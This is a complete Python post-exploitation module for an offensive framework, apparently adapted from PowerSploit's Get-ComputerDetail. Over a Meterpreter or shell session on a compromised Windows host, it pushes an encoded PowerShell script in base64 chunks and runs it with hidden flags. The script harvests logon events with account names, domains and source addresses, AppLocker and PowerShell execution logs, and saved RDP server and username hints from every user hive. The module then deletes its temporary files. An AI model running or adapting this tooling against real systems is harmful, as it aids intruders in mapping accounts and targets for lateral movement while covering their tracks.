#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import base64
import re

class Module(Post):
    __info__ = {
        "name": "Windows Gather Computer Detail",
        "description": "Runs Get-ComputerDetail on a Windows shell or Meterpreter session to collect logon, PowerShell, AppLocker, and RDP client artifacts.",
        "author": "KittySploit Team / Joe Bialek",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "http://clymb3r.wordpress.com/",
            "https://github.com/clymb3r/PowerShell",
        ],
    }

    to_string = OptBool(True, "Return plain-text output instead of JSON", False)
    cleanup = OptBool(True, "Remove temporary files from the remote host", False)

    def _powershell_script(self) -> str:
        return r"""
function Get-ComputerDetail
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    Param(
        [Parameter(Position=0)]
        [Switch]
        $ToString
    )

    Set-StrictMode -Version 2

    $SecurityLog = Get-EventLog -LogName Security
    $Filtered4624 = Find-4624Logon $SecurityLog
    $Filtered4648 = Find-4648Logon $SecurityLog
    $AppLockerLogs = Find-AppLockerLog
    $PSLogs = Find-PSScriptsInPSAppLog
    $RdpClientData = Find-RDPClientConnection

    if ($ToString)
    {
        Write-Output "Event ID 4624 (Logon):"
        Write-Output $Filtered4624.Values | Format-List
        Write-Output "Event ID 4648 (Explicit Credential Logon):"
        Write-Output $Filtered4648.Values | Format-List
        Write-Output "AppLocker Process Starts:"
        Write-Output $AppLockerLogs.Values | Format-List
        Write-Output "PowerShell Script Executions:"
        Write-Output $PSLogs.Values | Format-List
        Write-Output "RDP Client Data:"
        Write-Output $RdpClientData.Values | Format-List
    }
    else
    {
        $Properties = @{
            LogonEvent4624 = $Filtered4624.Values
            LogonEvent4648 = $Filtered4648.Values
            AppLockerProcessStart = $AppLockerLogs.Values
            PowerShellScriptStart = $PSLogs.Values
            RdpClientData = $RdpClientData.Values
        }

        $ReturnObj = New-Object PSObject -Property $Properties
        return $ReturnObj
    }
}

function Find-4648Logon
{
    Param(
        $SecurityLog
    )

    $ExplicitLogons = $SecurityLog | Where-Object {$_.InstanceID -eq 4648}
    $ReturnInfo = @{}

    foreach ($ExplicitLogon in $ExplicitLogons)
    {
        $Subject = $false
        $AccountWhosCredsUsed = $false
        $TargetServer = $false
        $SourceAccountName = ""
        $SourceAccountDomain = ""
        $TargetAccountName = ""
        $TargetAccountDomain = ""
        $TargetServer = ""
        foreach ($line in $ExplicitLogon.Message -split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $Subject = $true
            }
            elseif ($line -cmatch "^Account\sWhose\sCredentials\sWere\sUsed:$")
            {
                $Subject = $false
                $AccountWhosCredsUsed = $true
            }
            elseif ($line -cmatch "^Target\sServer:")
            {
                $AccountWhosCredsUsed = $false
                $TargetServer = $true
            }
            elseif ($Subject -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $SourceAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $SourceAccountDomain = $Matches[1]
                }
            }
            elseif ($AccountWhosCredsUsed -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $TargetAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $TargetAccountDomain = $Matches[1]
                }
            }
            elseif ($TargetServer -eq $true)
            {
                if ($line -cmatch "\s+Target\sServer\sName:\s+(\S.*)")
                {
                    $TargetServer = $Matches[1]
                }
            }
        }

        if (-not ($TargetAccountName -cmatch "^DWM-.*" -and $TargetAccountDomain -cmatch "^Window\sManager$"))
        {
            $Key = $SourceAccountName + $SourceAccountDomain + $TargetAccountName + $TargetAccountDomain + $TargetServer
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4648
                    LogSource = "Security"
                    SourceAccountName = $SourceAccountName
                    SourceDomainName = $SourceAccountDomain
                    TargetAccountName = $TargetAccountName
                    TargetDomainName = $TargetAccountDomain
                    TargetServer = $TargetServer
                    Count = 1
                    Times = @($ExplicitLogon.TimeGenerated)
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$ExplicitLogon.TimeGenerated
            }
        }
    }

    return $ReturnInfo
}

function Find-4624Logon
{
    Param (
        $SecurityLog
    )

    $Logons = $SecurityLog | Where-Object {$_.InstanceID -eq 4624}
    $ReturnInfo = @{}

    foreach ($Logon in $Logons)
    {
        $SubjectSection = $false
        $NewLogonSection = $false
        $NetworkInformationSection = $false
        $AccountName = ""
        $AccountDomain = ""
        $LogonType = ""
        $NewLogonAccountName = ""
        $NewLogonAccountDomain = ""
        $WorkstationName = ""
        $SourceNetworkAddress = ""
        $SourcePort = ""

        foreach ($line in $Logon.Message -Split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $SubjectSection = $true
            }
            elseif ($line -cmatch "^Logon\sType:\s+(\S.*)")
            {
                $LogonType = $Matches[1]
            }
            elseif ($line -cmatch "^New\sLogon:$")
            {
                $SubjectSection = $false
                $NewLogonSection = $true
            }
            elseif ($line -cmatch "^Network\sInformation:$")
            {
                $NewLogonSection = $false
                $NetworkInformationSection = $true
            }
            elseif ($SubjectSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $AccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $AccountDomain = $Matches[1]
                }
            }
            elseif ($NewLogonSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $NewLogonAccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $NewLogonAccountDomain = $Matches[1]
                }
            }
            elseif ($NetworkInformationSection)
            {
                if ($line -cmatch "^\s+Workstation\sName:\s+(\S.*)")
                {
                    $WorkstationName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sNetwork\sAddress:\s+(\S.*)")
                {
                    $SourceNetworkAddress = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sPort:\s+(\S.*)")
                {
                    $SourcePort = $Matches[1]
                }
            }
        }

        if (-not ($NewLogonAccountDomain -cmatch "NT\sAUTHORITY" -or $NewLogonAccountDomain -cmatch "Window\sManager"))
        {
            $Key = $AccountName + $AccountDomain + $NewLogonAccountName + $NewLogonAccountDomain + $LogonType + $WorkstationName + $SourceNetworkAddress + $SourcePort
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4624
                    LogSource = "Security"
                    SourceAccountName = $AccountName
                    SourceDomainName = $AccountDomain
                    NewLogonAccountName = $NewLogonAccountName
                    NewLogonAccountDomain = $NewLogonAccountDomain
                    LogonType = $LogonType
                    WorkstationName = $WorkstationName
                    SourceNetworkAddress = $SourceNetworkAddress
                    SourcePort = $SourcePort
                    Count = 1
                    Times = @($Logon.TimeGenerated)
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$Logon.TimeGenerated
            }
        }
    }

    return $ReturnInfo
}

function Find-AppLockerLog
{
    $ReturnInfo = @{}

    $AppLockerLogs = Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -ErrorAction SilentlyContinue | Where-Object {$_.Id -eq 8002}

    foreach ($Log in $AppLockerLogs)
    {
        $SID = New-Object System.Security.Principal.SecurityIdentifier($Log.Properties[7].Value)
        $UserName = $SID.Translate([System.Security.Principal.NTAccount])
        $ExeName = $Log.Properties[10].Value
        $Key = $UserName.ToString() + "::::" + $ExeName

        if (!$ReturnInfo.ContainsKey($Key))
        {
            $Properties = @{
                Exe = $ExeName
                User = $UserName.Value
                Count = 1
                Times = @($Log.TimeCreated)
            }

            $Item = New-Object PSObject -Property $Properties
            $ReturnInfo.Add($Key, $Item)
        }
        else
        {
            $ReturnInfo[$Key].Count++
            $ReturnInfo[$Key].Times += ,$Log.TimeCreated
        }
    }

    return $ReturnInfo
}

Function Find-PSScriptsInPSAppLog
{
    $ReturnInfo = @{}
    $Logs = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Where-Object {$_.Id -eq 4100}

    foreach ($Log in $Logs)
    {
        $LogDetails = $Log.Message -split "`r`n"
        $FoundScriptName = $false
        $User = ""

        foreach($Line in $LogDetails)
        {
            if ($Line -imatch "^\s*Script\sName\s=\s(.+)")
            {
                $ScriptName = $Matches[1]
                $FoundScriptName = $true
            }
            elseif ($Line -imatch "^\s*User\s=\s(.*)")
            {
                $User = $Matches[1]
            }
        }

        if ($FoundScriptName)
        {
            $Key = $ScriptName + "::::" + $User

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    ScriptName = $ScriptName
                    UserName = $User
                    Count = 1
                    Times = @($Log.TimeCreated)
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$Log.TimeCreated
            }
        }
    }

    return $ReturnInfo
}

Function Find-RDPClientConnection
{
    $ReturnInfo = @{}

    New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS | Out-Null

    $Users = Get-ChildItem -Path "HKU:\"
    foreach ($UserSid in $Users.PSChildName)
    {
        $Servers = Get-ChildItem "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue

        foreach ($Server in $Servers)
        {
            $Server = $Server.PSChildName
            $UsernameHint = (Get-ItemProperty -Path "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers\$($Server)").UsernameHint
            $Key = $UserSid + "::::" + $Server + "::::" + $UsernameHint

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $SIDObj = New-Object System.Security.Principal.SecurityIdentifier($UserSid)
                $User = ($SIDObj.Translate([System.Security.Principal.NTAccount])).Value

                $Properties = @{
                    CurrentUser = $User
                    Server = $Server
                    UsernameHint = $UsernameHint
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
        }
    }

    return $ReturnInfo
}
"""

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        try:
            output = self.cmd_execute(command)
            return output.strip() if output else ""
        except Exception as exc:
            raise ProcedureError(FailureType.Unknown, f"Command execution failed: {exc}")

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _remote_temp_dir(self) -> str:
        output = self._execute_cmd("echo %TEMP%")
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _write_remote_script(self, temp_dir: str) -> tuple[str, str]:
        script_path = f"{temp_dir}\\computer_detail.ps1"
        blob_path = f"{temp_dir}\\computer_detail.b64"
        payload = base64.b64encode(self._powershell_script().encode("utf-8")).decode("ascii")
        chunks = [payload[i:i + 3500] for i in range(0, len(payload), 3500)]

        for index, chunk in enumerate(chunks):
            method = "WriteAllText" if index == 0 else "AppendAllText"
            ps = (
                f"[IO.File]::{method}('{blob_path}','{chunk}');"
            )
            self._run_powershell(ps)

        decode_script = (
            f"$b=[IO.File]::ReadAllText('{blob_path}');"
            f"[IO.File]::WriteAllText('{script_path}',"
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)));"
        )
        self._run_powershell(decode_script)
        return script_path, blob_path

    def _collect_output(self, script_path: str, temp_dir: str, to_string: bool) -> str:
        output_path = f"{temp_dir}\\computer_detail.out"
        if to_string:
            invoke = (
                "$ProgressPreference='SilentlyContinue';"
                f". '{script_path}';"
                f"Get-ComputerDetail -ToString | Out-File -FilePath '{output_path}' -Width 4096 -Encoding UTF8"
            )
        else:
            invoke = (
                "$ProgressPreference='SilentlyContinue';"
                f". '{script_path}';"
                f"Get-ComputerDetail | ConvertTo-Json -Depth 6 | Out-File -FilePath '{output_path}' -Width 4096 -Encoding UTF8"
            )

        run_output = self._run_powershell(invoke)
        if run_output and re.search(r"(Exception|cannot find|is not recognized|error)", run_output, re.I):
            print_warning(run_output)

        result = self._execute_cmd(f'type "{output_path}"')
        return result

    def _cleanup_remote(self, paths):
        for path in paths:
            self._execute_cmd(f'del /f /q "{path}"')

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False

        return True

    def run(self):
        print_status("Preparing Get-ComputerDetail PowerShell payload...")
        temp_dir = self._remote_temp_dir()
        script_path, blob_path = self._write_remote_script(temp_dir)
        output_path = f"{temp_dir}\\computer_detail.out"

        print_status("Running Get-ComputerDetail on the target...")
        result = self._collect_output(script_path, temp_dir, self.to_string)

        if self.cleanup:
            print_status("Cleaning up temporary artifacts...")
            self._cleanup_remote([script_path, blob_path, output_path])

        if not result:
            raise ProcedureError(
                FailureType.Unknown,
                "No output was returned. The target may block access to one or more event logs.",
            )

        print_success("Get-ComputerDetail completed")
        print_info(result)
        return True
